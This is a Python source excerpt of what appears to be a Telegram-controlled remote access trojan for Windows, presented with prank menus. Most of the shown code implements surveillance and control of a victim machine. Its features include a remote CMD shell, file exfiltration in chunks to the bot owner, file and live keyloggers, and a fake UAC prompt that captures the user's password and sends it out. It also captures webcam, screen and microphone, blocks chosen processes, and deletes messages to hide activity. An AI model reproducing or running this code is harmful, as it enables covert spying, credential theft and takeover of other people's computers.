            "microphone":self.send_record_audio,
            "help":lambda: self.bsend(self.help),
            "invertedscreen":self.inverted_screen,
            "johnporknoaudio":self.johnporknoaudio,
            "cmdsession":self.cmdsession,
            "planktonnoaudio":self.planktonnoaudio,
            "distortedscreen":self.distorted_screen,
            "displaymode":self.display_mode,
            "jumpscarenoaudio":self.jumpscarenoaudio,
            "deletemessages":self.deleteallmessages,
            "deleteallmessages":self.deleteallmessages,
            "getip":self.getip,
            "mouselock":self.mouselock,
            "fullclip":self.record_webcam_and_screen,
            "selfdestruction":self.selfdestruction,
            "duckyhelp":lambda: self.bsend(self.duckyhelp),
            "duckyscript": lambda *args: toducky(" ".join(args), execute=True),
            "capslock": lambda: toducky("CAPSLOCK", execute=True),
            "randomkeyboard":self.randomkeyboard,
            "terminateprocess":terminate_process_by_name,
            "setvideowallpaper":self.setvideowallpaper,
            "id":lambda:self.bsend(f"🆔 CHAT_ID: {self.owner_id}"),
            "recordjum":self.record_jumpscare_reaction,
            "mutevolume":lambda:self.audio_mixer.mute(),
            "setvolume":self.audio_mixer.setVolumePercentage,
            "fullvolume":lambda:self.audio_mixer.full(),
            "wifiinfo":self.wifiinfo,
            "webcamstreamstart":self.start_webcam_tunnel,
            "screenstreamstart":self.start_screen_tunnel,
            "webcamstreamstop":self.stop_webcam_tunnel,
            "screenstreamstop":self.stop_screen_tunnel,
            "webcamandscreenstreamstart":self.start_webcam_and_screen_tunnel,
            "webcamandscreenstreamstop":self.stop_webcam_and_screen_tunnel,
            "mixermenu":self.mixer_menu,
            "procmonadd":self.processmonitoradd,
            "procmonrem":self.processmonitorrem,
            "procmonmenu":self.processmonitormenushow,
            "camerawallpaper":self.setCameraAsWallpaper,
            "mousecontroller":self.mousecontroller,
            "cantopenmenu":self.cantopenmenu,
            "cantopenadd":self.cantopen,
            "cantopenremove":self.removefromcantopen,
            "clear":self.clear,
            "mouser":self.mouser,
            "mousel":self.mousel,
            "mouseu":self.mouseu,
            "moused":self.moused,
            "setMouseJump":self.setMouseJump,
            "mainmenu":self.mainmenu,
            "menu_system":self.menu_system,
            "menu_network":self.menu_network,
            "menu_camera":self.menu_camera,
            "menu_audio":self.menu_audio,
            "menu_pranks":self.menu_pranks,
            "menu_control":self.menu_control,
            "menu_input":self.menu_input,
            "menu_messaging":self.menu_messaging,
            "menu_cantopen":self.menu_cantopen,
            "menu_keylogger":self.menu_keylogger,
            "menu_misc":self.menu_misc,
            "menu_plugins":self.menu_plugins,
            "leftclick":self.leftclick,
            "rightclick":self.rightclick,
            "nothing":lambda:...,
            "getvolume":lambda:self.bsend(f"Current Volume: {self.audio_mixer.getVolumePercentage()}"),
            "tralalerotralala":lambda:self.__play_loaded_sound("tralarero-tralala", volume=8),
        }

        LOADING_STATUS_MESSAGE.edit("COMMANDS LOADED, LOADING PLUGINS")

        sleep(.25)
        self.plugins = self.load_plugins()
        if self.plugins:
            function_table_update = {v[0]:v[1] for k,v in self.plugins.items()}
            self.plugins_buttons = {k:f"/{v[0]}" for k,v in self.plugins.items()}
            self.function_table.update(function_table_update)
        LOADING_STATUS_MESSAGE.edit("PLUGINS LOADED")

        sleep(.25)
        self.no_background_functions = [self.message_box, self.spam_windows]
        LOADING_STATUS_MESSAGE.edit("READY")
        LOADING_STATUS_MESSAGE.delete()

    def __play_loaded_sound(self, audio: str, volume=None) -> None:
        old = self.audio_mixer.getVolumePercentage()
        if volume:
            self.set_volume(volume)
        self.__playsound(self.audios[audio])
        sleep(5)
        if volume:
            self.set_volume(old)

    def __playsound(self, audio: str) -> None:
        PlaySound(audio, SND_FILENAME | SND_ASYNC)

    def __send_image(self, image_name: str, caption=None) -> bool:
        try:
            with open(image_name, "rb") as image:
                msg = self.bot.sendPhoto(self.owner_id, image, caption=caption)["message_id"]
            return msg
        except Exception as e:
            return self.bsend(f"Error while sending an image\n{e}")

    def altf4(self) -> None:
        self.bsend(f"{emoji_dict['keyboard']} Alt F4 Pressed")
        press_key('alt')
        press_key('f4')
        release_key('f4')
        release_key('alt')

    def ask_yesno(self, custom_message: str = "Confirm? Y/n") -> bool:
        return self.send_prompt(custom_message).lower().strip() == "y"

    def breath(self) -> None:
        self.__play_loaded_sound("breath")

    def bsend(self, text: str, retries=0, parse_mode:str|None=None, reply_markup=None) -> int|None:
        if retries>3:
            return
        try:
            if checkconn():
                message_id = self.bot.sendMessage(self.owner_id, text, parse_mode=parse_mode, reply_markup=reply_markup)["message_id"]
                self.all_session_messages.append(message_id)
                return message_id
            raise ConnectionError
        except Exception as e:
            return self.bsend(text, retries+1)

    def download_file(self, path: str) -> None:
        self.bsend(f"📤 Sending file: {path}")
        if not isfile(path):
            self.bsend(f"❌ Could not send file.\nThe file `{path}` does not exist or you don't have permission to access it.")
            return

        size = getsize(path)

        if size <= TELEGRAM_BOT_LIMIT:
            with open(path, "rb") as fi:
                self.bot.sendDocument(self.owner_id, fi)
                self.bsend("✅ File has been sent successfully!")
            return

        base_name = basename(path)
        part_size = TELEGRAM_BOT_LIMIT - (len(base_name) + 10)

        with open(path, "rb") as f:
            part_num = 1
            while True:
                chunk = f.read(part_size)
                if not chunk:
                    break

                part_name = f"{base_name}.part{part_num:03d}"
                with open(part_name, "wb") as pf:
                    pf.write(chunk)

                with open(part_name, "rb") as pf:
                    self.bot.sendDocument(
                        self.owner_id,
                        pf,
                        caption=f"📦 {base_name} (part {part_num})"
                    )

                remove(part_name)
                #self.bsend(f"📦 Part {part_num} sent.")
                part_num += 1

        self.bsend("✅ All file parts have been sent successfully!")

    """
.oooooo.   ooo        ooooo oooooooooo.    .oooooo..o                              o8o
d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                              `"'
888           888b     d'888   888      888 Y88bo.       .ooooo.   .oooo.o  .oooo.o oooo   .ooooo.  ooo. .oo.
888           8 Y88. .P  888   888      888  `"Y8888o.  d88' `88b d88(  "8 d88(  "8 `888  d88' `88b `888P"Y88b
888           8  `888'   888   888      888      `"Y88b 888ooo888 `"Y88b.  `"Y88b.   888  888   888  888   888
`88b    ooo   8    Y     888   888     d88' oo     .d8P 888    .o o.  )88b o.  )88b  888  888   888  888   888
`Y8bood8P'  o8o        o888o o888bood8P'   8""88888P'  `Y8bod8P' 8""888P' 8""888P' o888o `Y8bod8P' o888o o888o
    """
    def cmdsession(self) -> None:
        """Interactive CMD session via Telegram."""

        # Initialize CMD session if not already created
        if self.cmd_session is None:
            self.cmd_session = CMDSession("cmd.exe /K cd /d %USERPROFILE%")

        if self.cmd_session_active:
            self.bsend("⚠️ CMD session is already active.")
            return

        self.cmd_session_active = True
        self.bsend(
            "💻 CMD session started.\n"
            "Type 'exit' to quit.\n"
            "Use :help for special commands."
        )

        # Start output reader threads
        self.cmd_session.run_output_reader_thread(
            lambda x: self.bsend(f"📥 {x}") if x.strip() else None,
            lambda x: self.bsend(f"⚠️ {x}") if x.strip() else None
        )

        sleep(1)  # give the session time to initialize

        while True:
            sleep(0.5)
            command = self.send_prompt("🖊️ ENTER A COMMAND: ")
            arguments = command.split()
            if not arguments:
                continue

            program = arguments[0].lower()

            if program == "exit":
                self.bsend("💻 CMD session stopped.")
                self.cmd_session.stop_output_readed_thread()
                self.cmd_session_active = False
                break

            elif program == ":help":
                self.bsend(CMD_SESSION_HELP)

            elif program == ":kill":
                self.cmd_session.stop_output_readed_thread()
                self.cmd_session.kill()
                self.bsend(
                    "💀 CMD session killed.\n"
                    "A new one will be initialized when you use /cmdsession again."
                )
                self.cmd_session_active = False
                self.cmd_session = None
                break

            elif program == ":download":
                path = " ".join(arguments[1:])
                self.bsend(f"📥 Preparing download for `{path}`")

                #this is used as a check cause somethimes the cwd is not properly captured and executing another command does the job. And cd almost looks good in it. 
                self.cmd_session.write_input("cd")
                sleep(4)  # I love working with processes..

                filepath = join(self.cmd_session.cwd, path)
                self.bsend(f"📦 Starting download for `{filepath}`")

                download_thread = Thread(target=self.download_file, args=(filepath,))
                download_thread.start()
                download_thread.join()

                self.bsend(f"✅ Download completed for `{filepath}`")

            else:
                self.cmd_session.write_input(command)
                self.bsend(f"▶️ Command sent: `{command}`")

    def cantopen(self, process: str) -> None:
        self.cantopenlist.append(process)
        self.bsend(f"🔒 Added {process} to cantopenlist.")

    def cantopenkiller(self) -> None:
        while self.running:
            for process in self.cantopenlist:
                if self.check_if_proc_running(process):
                    terminate_process_by_name(process)
            sleep(1)

    def cantopenmenu(self) -> None:
        if self.cantopenlist:
            dict_menu = { proc:f"/cantopenremove {proc}" for proc in self.cantopenlist}
            menu = self.new_menu(dict_menu, close_btn_lab="CANTOP_close")
            self.cantopenmenu_ref = menu
        else:
            self.bsend("Cantopenlist is empty.")

    def check_if_proc_running(self, processname) -> bool:
        return processname.lower().strip() in [x.name().lower().strip() for  x in psutil.process_iter()]

    def checkforface(self) -> None:
        res, frame = detect_face(self.cap)
        if res:
            self.bsend("Face found")
        else:
            self.bsend("Face not found")

    def clear(self) -> None:
        self.closecap()
        for file in listdir(BURN_DIRECTORY):
            try:
                if isfile(file):
                    remove(file)
            except:
                pass#ignore file errors
        destroyAllWindows()
        self.audio_mixer.mute()
        #self.restore_wallpaper()
        self.cantopenlist.clear()

    def closecap(self) -> None:
        if self.cap.isOpened():
            self.cap.release()

    def distorted_screen(self) -> None:
        self.modded_screenshot(lambda x: distorted_screen(x, randint(20, 40), randint(50, 55)))

    def display_mode(self) -> None:
        buttons = {
            "Only PC"      : "/execute DisplaySwitch.exe /internal",
            "Only External": "/execute DisplaySwitch.exe /external",
            "Clone"        : "/execute DisplaySwitch.exe /clone",
            "Extend"       : "/execute DisplaySwitch.exe /extend",
        }
        self.display_mode_keyboard = self.new_menu(buttons, close_btn_lab="DISPLAYSET_close")

    def delete_message(self, message_id: int) -> None:
        try:
            self.bot.deleteMessage((self.owner_id, message_id))
        except TelegramError:
            ...

    def deletemessages(self, number: int = 1) -> None:
        message_ids = self.all_session_messages[-number:]
        for message_id in message_ids:
            self.delete_message(message_id)
    
    def deleteallmessages(self) -> None:
        for message_id in self.all_session_messages:
            self.delete_message(message_id)

    def execute(self, *command, return_output: bool=False, shell: bool=False) -> None:
        command = " ".join(command)
        s = sp.run(command, shell=shell, stdout=sp.PIPE, stderr=sp.PIPE, encoding="cp850")
        if s.returncode:
            output = s.stderr
        else:
            output = s.stdout

        if output:
            if return_output:
                return output
            else:
                self.bsend(f"Output: {output}")

    def extract_commands(self) -> list[dict]:
        commands = findall(r'^([a-zA-Z0-9_]+) - (.*)', self.help, M)
        return [{'command': cmd, 'description': desc} for cmd, desc in commands]

    def fake_shutdown(self) -> None:
        system('shutdown /s /t 34 /c "Windows Error 104e240-69, please notify the administrator"')
        sleep(5)
        system("shutdown -a")

    def fakeuac(self) -> None:
        proc = sp.run(fake_uac_prompt_path, stdout=sp.PIPE, stderr=sp.PIPE)
        if proc.returncode:
            output = proc.stderr
        else:
            output = proc.stdout
        uacfiles = filter(lambda x:x.endswith(".fuac"), listdir())
        for file in uacfiles:
            with open(file, "r") as fi:
                password = fi.read().strip()
                self.bsend(f"Password: ||{password}||",parse_mode="MarkdownV2")
            remove(file)

    def gabinetti(self) -> None:
        self.jumpscare("plankton_meme", "gabinetti")

    def handle(self, msg: str) -> None:
        content_type, chat_type, chat_id = glance(msg)
        sender_name = msg["from"]["first_name"]
        message_id = msg["message_id"]

        if content_type != "pinned_message":
            self.all_session_messages.append(message_id)

        if chat_id == self.owner_id:
            self.owner_name = sender_name

            if content_type == "text":
                Thread(target=self.parse_text, args=(msg,)).start()
            elif content_type == "photo":
                self.parse_photo(msg)
            elif content_type == "document":
                self.parse_document(msg)
            elif content_type == "video":
                self.parse_document(msg, mimetype="video")
            elif content_type in ("voice", "audio"):
                self.parse_audio(msg)
            elif content_type == "pinned_message":
                self.delete_message(message_id)
            elif content_type == "video_note":
                self.parse_document(msg, mimetype="video_note")
            else:
                self.bsend(f"Unparsed content-type: {content_type}")
        else:
            self.bsend(f"What do you want {sender_name}, I don't work for you.")

    def inverted_screen(self) -> None:
        self.modded_screenshot(invert_image)

    def getip(self):
        output = self.execute("curl ifconfig.co", return_output=True)
        self.bsend(f"🌐 Public IP: {output}")

    def johnpork(self, audio=True) -> None:
        self.jumpscare("johnpork_meme", "johnpork", playaudio=audio, setvolume=100)

    def johnporknoaudio(self) -> None:
        self.johnpork(False)

    def jumpscare(self, image=None, audio=None, playaudio=True, showimage=True, setvolume: int=100) -> None:
        old_volume = self.audio_mixer.getVolumePercentage()
        self.audio_mixer.setVolumePercentage(setvolume)
        if image is None:
            image = self.images[choice(list(self.nomemes))]
        else:
            if image in self.images:
                image = self.images[image]
            else:
                image = imread(image)
        if audio is None:
            audio = self.audios["ghost-roar"]
        else:
            audio = self.audios[audio]
        imageThread = Thread(target=show_image_fullscreen ,args=(image,))

        if showimage:
            imageThread.start()
        if playaudio:
            self.__playsound(audio)
        if showimage:
            imageThread.join()
        self.audio_mixer.setVolumePercentage(old_volume)

    def jumpscarenoaudio(self) -> None:
        self.jumpscare(playaudio=False)

    def keylogger_to_buffer(self, state: dict["value":str,"running":bool]) -> None:
        while state["running"]:
            event = read_event()
            if event.event_type == KEY_DOWN:
                name = event.name
                if len(name) != 1:
                    if name == "space":
                        k=" "
                    elif name == "maiusc":
                        continue
                    elif name == "backspace":
                        state["value"]=state["value"][:-1]
                        continue
                    else:
                        k=f" <{name.upper()}> "
                else:
                    k = name
                state["value"]+=k

    def keylogger(self, timeout: int=10) -> None:
        buffer = ""
        start=time()
        loading_bar = self.new_loading_bar(timeout, f"{emoji_dict["keyboard"]} Keylogger with file", showperc=True)
        while (time()-start)<timeout:
            loading_bar.update(time()-start)
            event = read_event()
            if event.event_type == KEY_DOWN:
                name = event.name
                if len(name) != 1:
                    if name == "space":
                        k=" "
                    elif name == "maiusc":
                        continue
                    elif name == "backspace":
                        buffer = buffer[:-1]
                        continue
                    else:
                        k=f" <{name.upper()}> "
                else:
                    k = name
            buffer+=k
        filename = randomname()
        with open(filename, "w") as fo:
            fo.write(buffer)
        with open(filename, "r") as fi:
            self.bot.sendDocument(self.owner_id, (f"keylog{now()}.txt",fi))
        if isfile(filename):
            remove(filename)
        loading_bar.fill_and_delete()

    def leftclick(self) -> None:
        pg.leftClick()

    def live_keylogger(self, timeout=10) -> None:
        start = time()
        bar = self.new_loading_bar(timeout, label=f"📡 Live Keylogger")
        state = {"value":"📡 Live Keylogger Output: ",
                  "running":True}
        buffer_message = self.new_editable_message(state["value"])
        elapsed = 0
        Thread(target=self.keylogger_to_buffer, args=(state, )).start()
        while elapsed < timeout:
            elapsed = time()-start
            bar.update(elapsed)
            buffer_message.edit(state["value"])
        state["running"]=False
        bar.fill_and_delete()

    def load_plugins(self) -> None:
        try:
            from plugins.plugins import plugins
        except ImportError:
            plugins = None
        return plugins if plugins else None

    def message_box(self, text: str, title: str = "Warning") -> int:
        def run():
            ctypes.windll.user32.MessageBoxW(0, text, title, 0x1000)
        Thread(target=run, daemon=True).start()

    def mixer_menu(self) -> None:
        buttons = {
            "🔊Full Volume":"/fullvolume",
            "🔉Half Volume":"/setvolume 50",
            "🔇Mute":"/mutevolume",
        }
        self.mixer_menu_keyboard = self.new_menu(buttons, close_btn_lab="MXR_close")

    def modded_screenshot(self, effect: Callable, timeout: int=1250) -> None:
        filename = join(BURN_DIRECTORY, randompngname())
        pg.screenshot(filename)
        img = imread(filename)
        modded_img = effect(img)
        show_image_fullscreen(modded_img, timeout)

    def mousecontroller(self) -> None:
        menu = {
            "LEFT CLICK":"/leftclick", "UP":"/mouseu","RIGHTCLICK":"/rightclick",
            "LEFT":"/mousel","DOWN":"/moused","RIGHT":"/mouser"
        }
        self.mouse_controller_menu = self.new_menu(menu, label=f"{emoji_dict['mouse']} Mouse Control", rows=3, close_btn_lab="MOUSE_closemenu")

    def setMouseJump(self, jump: int= None) -> None:
        if jump is None:
            jmp = self.send_prompt("Set mouse jump: ")
        if jmp.isnumeric():
            jmp = int(jmp)
            if jmp < 1:
                self.bsend("Mouse jump mouse be above 0.")
            self.MOUSE_JMP = jmp
        else:
            self.bsend("Mouse jump must be numeric.")

    def moused(self) -> None:
        pos = pg.position()
        pg.moveTo(pos[0], pos[1]+self.MOUSE_JMP)

    def mousel(self) -> None:
        pos = pg.position()
        pg.moveTo(pos[0]-self.MOUSE_JMP, pos[1])

    def mouser(self) -> None:
        pos = pg.position()
        pg.moveTo(pos[0]+self.MOUSE_JMP, pos[1])

    def mouseu(self) -> None:
        pos = pg.position()
        pg.moveTo(pos[0], pos[1]-self.MOUSE_JMP)

    def mouselock(self, timer: int=6) -> None:
        bar = self.new_loading_bar(timer, label=f"{emoji_dict['mouse']} Mouselock")
        start = time()
        pos = pg.position()
        time_elapsed = 0
        while timer > time_elapsed:
            time_elapsed = time()-start
            bar.update(time_elapsed)
            pg.moveTo(pos)
        bar.fill_and_delete()

    def mainmenu(self):
        buttons = {
            "🛑 System & Shutdown": "/menu_system",
            "🌐 Network & Remote Access": "/menu_network",
            "📸 Camera & Screen": "/menu_camera",
            "🔊 Audio & Volume": "/menu_audio",
            "😈 Pranks & Visuals": "/menu_pranks",
            "💻 System Control": "/menu_control",
            "🎮 Input / Device Control": "/menu_input",
            "📋 Messaging": "/menu_messaging",
            "🔒 Can't Open List": "/menu_cantopen",
            "🧠 Keylogger": "/menu_keylogger",
            "🦑 Misc": "/menu_misc",
            "🔌 PlugIns": "/menu_plugins",
        }
        if self.mainmenu_ref:
            self.mainmenu_ref.delete()
        self.mainmenu_ref = self.new_menu(buttons, label="Select a category:", close_btn_lab="mainmenu_close", next_btn=True, next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
        return self.mainmenu_ref

    def menu_plugins(self):
        buttons = self.plugins_buttons
        if buttons:
            if self.mainmenu_ref:
                self.mainmenu_ref.delete()
            self.mainmenu_ref = self.new_menu(buttons, label="🔌 Your Plugins", close_btn_lab="mainmenu_close", next_btn=True, next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
        else:
            self.bsend("🔌No plugins loaded")

    def menu_system(self):
        buttons = {
            "🔙 Back": "/mainmenu",
            "🛑 Shutdown": "/shutdown",
            "🎭 Fakeshutdown": "/fakeshutdown",
            "⌨️ Altf4": "/altf4",
            "🧹 Clear": "/clear",
            "💣 Selfdestruction": "/selfdestruction",
            "Fake UAC":"/fakeuac",
        }
        if self.mainmenu_ref:
            self.mainmenu_ref.delete()
        self.mainmenu_ref = self.new_menu(buttons, label="🛑 System & Shutdown", close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
        return self.mainmenu_ref

    def menu_network(self):
        buttons = {
            "🔙 Back": "/mainmenu",
            "📶 Wifiinfo": "/wifiinfo",
            "🌐 Getip": "/getip",
        }

        if self.mainmenu_ref:
            self.mainmenu_ref.delete()
        self.mainmenu_ref = self.new_menu(buttons, label="🌐 Network & Remote Access", close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
        return self.mainmenu_ref

    def menu_camera(self):
        buttons = {
            "🔙 Back": "/mainmenu",
            "🤳 Selfie": "/selfie",
            "📸 Screenshot": "/screenshot",
            "🎞️ Fullclip": "/fullclip",
            "🎥 Webcamclip": "/webcamclip",
            "🖥️ Screenclip": "/screenclip",
            "🎙️ Recordjum": "/recordjum",
            "⏳ Waitforface": "/waitforface",
            "🖼️ Displaymode": "/displaymode",
            "📷🟢 Webcamstreamstart": "/webcamstreamstart",
            "🖥️🟢 Screenstreamstart": "/screenstreamstart",
            "📷🔴 Webcamstreamstop": "/webcamstreamstop",
            "🖥️🔴 Screenstreamstop": "/screenstreamstop",
            "📷🖥️🟢 Webcamandscreenstreamstart": "/webcamandscreenstreamstart",
            "📷🖥️🔴 Webcamandscreenstreamstop": "/webcamandscreenstreamstop",
        }

        if self.mainmenu_ref:
            self.mainmenu_ref.delete()
        self.mainmenu_ref = self.new_menu(buttons, label="📸 Camera & Screen", next_btn=True, close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
        return self.mainmenu_ref

    def menu_audio(self):
        buttons = {
            "🔙 Back": "/mainmenu",
            "💨 Breath": "/breath",
            "📢 Pss": "/pss",
            "🔔 Urltoast": "/urltoast",
            "🎙️ Microphone": "/microphone",
            "🔇 Mutevolume": "/mutevolume",
            "🔊 Fullvolume": "/fullvolume",
            "🎚️ Setvolume": "/setvolume",
            "📈 Getvolume": "/getvolume",
            "🎶 Tralalerotralala": "/tralalerotralala",
            "🎛️ Mixermenu": "/mixermenu",
        }

        if self.mainmenu_ref:
            self.mainmenu_ref.delete()
        self.mainmenu_ref = self.new_menu(buttons, label="🔊 Audio & Volume", next_btn=True, close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
        return self.mainmenu_ref

    def menu_pranks(self):
        buttons = {
            "🔙 Back": "/mainmenu",
            "👻 Jumpscare": "/jumpscare",
            "😶‍🌫️ Jumpscarenoaudio": "/jumpscarenoaudio",
            "🔄 Invertedscreen": "/invertedscreen",
            "🌀 Distortedscreen": "/distortedscreen",
            "💬 Messagebox": "/messagebox",
            "📨 Messagespam": "/messagespam",
            "📷 Camerawallpaper": "/camerawallpaper",
            "🎞️ Setvideowallpaper": "/setvideowallpaper",
        }

        if self.mainmenu_ref:
            self.mainmenu_ref.delete()
        self.mainmenu_ref = self.new_menu(buttons, label="😈 Pranks & Visuals", next_btn=True, close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
        return self.mainmenu_ref

    def menu_control(self):
        buttons = {
            "🔙 Back": "/mainmenu",
            "⚙️ Execute": "/execute",
            "💀 Processkiller": "/processkiller",
            "🛑 Terminateprocess": "/terminateprocess",
            "📊 Procmonmenu": "/procmonmenu",
            "➕ Procmonadd": "/procmonadd",
            "➖ Procmonrem": "/procmonrem",
            "</> CMDSession": "/cmdsession"
        }
        if self.mainmenu_ref:
            self.mainmenu_ref.delete()
        self.mainmenu_ref = self.new_menu(buttons, label="💻 System Control", close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
        return self.mainmenu_ref

    def menu_input(self):
        buttons = {
            "🔙 Back": "/mainmenu",
            "🎹 Randomkeyboard": "/randomkeyboard",
            "🔠 Capslock": "/capslock",
            "🖱️ Mouselock": "/mouselock",
            "🎮 Mousecontroller": "/mousecontroller",
        }

        if self.mainmenu_ref:
            self.mainmenu_ref.delete()
        self.mainmenu_ref = self.new_menu(buttons, label="🎮 Input / Device Control", close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
        return self.mainmenu_ref

    def menu_messaging(self):
        buttons = {
            "🔙 Back": "/mainmenu",
            "📤 Bsend": "/bsend",
            "🆔 Id": "/id",
            "❌ Deletemessages": "/deletemessages",
            "🗑️ Deleteallmessages": "/deleteallmessages",
        }

        if self.mainmenu_ref:
            self.mainmenu_ref.delete()
        self.mainmenu_ref = self.new_menu(buttons, label="📋 Messaging", close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
        return self.mainmenu_ref

    def menu_cantopen(self):
        buttons = {
            "🔙 Back": "/mainmenu",
            "🚫 Cantopenadd": "/cantopenadd",
            "❌ Cantopenremove": "/cantopenremove",
            "📋 Cantopenmenu": "/cantopenmenu",
        }

        if self.mainmenu_ref:
            self.mainmenu_ref.delete()
        self.mainmenu_ref = self.new_menu(buttons, label="🔒 Can't Open List", close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
        return self.mainmenu_ref

    def menu_keylogger(self):
        buttons = {
            "🔙 Back": "/mainmenu",
            "⌨️ Keylogger": "/keylogger",
            "📡 Livekeylogger": "/livekeylogger",
        }

        if self.mainmenu_ref:
            self.mainmenu_ref.delete()
        self.mainmenu_ref = self.new_menu(buttons, label="🧠 Keylogger", close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
        return self.mainmenu_ref

    def menu_misc(self):
        buttons = {
            "🔙 Back": "/mainmenu",
            "🦑 Plankton": "/plankton",
            "🔇 Planktonnoaudio": "/planktonnoaudio",
            "🐷 Johnpork": "/johnpork",
            "🔕 Johnporknoaudio": "/johnporknoaudio",
            "🛋️ Gabinetti": "/gabinetti",
            "⌨️ Duckyscript": "/duckyscript",
            "❓ Duckyhelp": "/duckyhelp",
            "🌐 Browser": "/browser",
        }

        if self.mainmenu_ref:
            self.mainmenu_ref.delete()
        self.mainmenu_ref = self.new_menu(buttons, label="🦑 Misc", next_btn=True, close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
        return self.mainmenu_ref

    def new_editable_message(self, content: str, autosend: bool=True) -> EditableMessage:
        editable = EditableMessage(self.bot, self.owner_id, content, autosend)
        self.all_session_messages.append(editable.message_id)
        return editable

    def new_loading_bar(self, total: int, autodelete: bool=False, showperc:bool=False, label=None) -> LoadingBar:
        loadingbar = LoadingBar(total, self.owner_id, self.bot, autodelete=autodelete, showperc=showperc, label=label, full_char=self.loading_bar_set[0], empty_char=self.loading_bar_set[1], spinner_frames=self.loading_bar_spinner, spinner_pos="right", bar_lenght=10) 
        self.all_session_messages.append(loadingbar.ETDMessage.message_id)
        return loadingbar

    def new_menu(self, menu: dict[str:Any], autosend: bool=True, label: str="Choose an option: ", page: int=0, next_btn: bool=False, next_btn_lab: str="next_page", prev_btn_lab: str="previus_page", close_btn_lab: str="close_page", rows=2) -> ButtonsMenu:
        menu = ButtonsMenu(self.owner_id, self.bot, menu, label, autosend, page=page, next_btn=next_btn, next_btn_lab=next_btn_lab, prev_btn_lab=prev_btn_lab, close_btn_lab=close_btn_lab, keyboard_rows=rows)
        self.all_session_messages.append(menu.message_id)
        return menu

    def on_callback_query(self, msg) -> None:
        query_id, from_id, data = glance(msg, flavor="callback_query")
        Thread(target=self.parse_command, args=(data, )).start()
        self.bot.answerCallbackQuery(query_id)

    def opencap(self) -> None:
        if not self.cap.isOpened():
            self.cap.open(0)

    def parse_audio(self, msg: dict) -> None:
        if 'voice' in msg:
            file_id = msg['voice']['file_id']
        elif 'audio' in msg:
            file_id = msg['audio']['file_id']
        file_info = self.bot.getFile(file_id)
        file_url = f"https://api.telegram.org/file/bot{self.token}/{file_info['file_path']}"
        filename = randomname()+".ogg"
        filepath = join(BURN_DIRECTORY, filename)
        response = requests.get(file_url)
        with open(filepath, "wb") as f:
            f.write(response.content) 
        filepath = ogg_to_wav(filepath, rmold=True)
        self.__playsound(filepath)
        remove(filepath)

    def parse_command(self, text: str) -> None:
        args = text.split()
        command = args[0]

        if command.startswith("/"):
            command = args[0][1:]
        function_args = args[1:]
        function_args = map(lambda x:x.replace("<SPACE>"," "), function_args)
        function_args = list(map(lambda x: int(x) if x.isdigit() else x, function_args))

        func = self.function_table.get(command)
        if func:
            function_needed_args = get_required_params(func)
            if function_needed_args:
                if function_needed_args[0] == "self":
                    function_needed_args=function_needed_args[1:]
                
            function_all_args = get_function_parameters(func)
            if function_all_args:
                if function_all_args[0] == "self":
                    function_all_args=function_all_args[1:]

            try:
                if func in self.no_background_functions:
                    func(*function_args)
                else:
                    skip_len = False
                    if "*args" in function_all_args:
                        skip_len = True
                    if (len(function_args) < len(function_needed_args) or len(function_args) > len(function_all_args)) and not(skip_len):
                        raise TypeError("Wrong number of arguments for this function")
                    if function_args:
                        thread_args = (*function_args,)
                        new_thread = Thread(target=func, args=thread_args)
                    else:
                        new_thread = Thread(target=func)
                    new_thread.start()
            except TypeError as e:
                args = {} 
                for arg in function_needed_args:
                    if arg == "self":
                        continue
                    response = self.send_prompt(f"Choose a {arg} for {command}")
                    response = response.replace(" ","<SPACE>")
                    args[arg] = response
                self.parse_command(f"/{command} " + " ".join(args.values()))
            except Exception as e:
                self.bsend(f"Unhandled error for function {command}\n{e}")

        elif command.startswith("PK"):
            if command == "PK_next_page" and self.process_explorer_menu:
                self.process_killer_page += 1
                self.process_killer(page=self.process_killer_page)
            elif command == "PK_previous_page" and self.process_explorer_menu:
                self.process_killer_page -= 1
                self.process_killer(page=self.process_killer_page)
            elif command == "PK_close_page" and self.process_explorer_menu:
                self.process_explorer_menu.delete()
            elif command in ("PK_next_page", "PK_previous_page") and not self.process_explorer_menu:
                self.bsend("Use /processkiller first")

        elif command.startswith("DISPLAYSET"):
            if command == "DISPLAYSET_close":
                if self.display_mode_keyboard:
                    self.display_mode_keyboard.delete()
                    self.display_mode_keyboard = None

        elif command.startswith("MOUSE"):
            if command == "MOUSE_closemenu":
                if self.mouse_controller_menu:
                    self.mouse_controller_menu.delete()
                    self.mouse_controller_menu = None

        elif command.startswith("MXR"):
            if command == "MXR_close":
                if self.mixer_menu_keyboard:
                    self.mixer_menu_keyboard.delete()
                    self.mixer_menu_keyboard = None

        elif command.startswith("PROCMON"):
            if self.processmonitormenu:
                if command == "PROCMON_close":
                    self.processmonitormenu.delete()
                    self.processmonitormenu = None
                elif command.startswith("PROCMON_procmonrem"):
                    process = function_args[0]
                    self.processmonitorrem(process)
                    self.processmonitormenu.delete()
                    self.processmonitormenushow()

        elif command.startswith("CANTOP"):
            if command == "CANTOP_close":
                self.cantopenmenu_ref.delete()
                self.cantopenmenu_ref = None

        elif command.startswith("mainmenu"):
            if self.mainmenu_ref:
                if command == "mainmenu_close":
                    self.mainmenu_ref.delete()
                    self.mainmenu_ref = None
                elif command == "mainmenu_next":
                    self.mainmenu_ref.delete()
                    self.mainmenu_ref.send_next_page()
                elif command == "mainmenu_prev":
                    self.mainmenu_ref.delete()
                    self.mainmenu_ref.send_previous_page()
        else:
